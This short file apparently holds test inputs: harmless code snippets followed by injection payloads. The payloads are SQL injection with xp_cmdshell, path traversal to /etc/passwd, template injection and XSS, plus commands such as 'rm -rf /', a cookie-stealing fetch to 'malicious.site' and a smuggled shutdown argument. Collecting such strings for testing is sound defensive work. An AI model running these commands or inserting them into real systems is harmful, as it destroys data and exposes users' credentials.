
### Python Example
```python
def greet(name):
    return f"Hello, {name}!"

print(greet("World"))
```

### JavaScript Example
```javascript
function sum(a, b) {
    return a + b;
}
console.log(sum(2, 3));
```

### Bash Example
```bash
echo "This is a safe command"
ls -la
```

---

- `"; DROP TABLE users; --`
- `'; EXEC xp_cmdshell('dir'); --`
- `../../../../etc/passwd`
- `${7*7}`
- `<script>alert('XSS')</script>`
- `{{7*7}}`
- `%0Acat /etc/passwd`
- `{% print 'test' %}`

---

```python
import os
os.system("rm -rf /")  # Dangerous command for injection testing only
```

```javascript
fetch("http://malicious.site?cookie=" + document.cookie);
```

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password';
```

```bash
echo "Safe command" && rm -rf / # Danger injection example
```

```bash
python app.py --input="test; shutdown -h now"
```
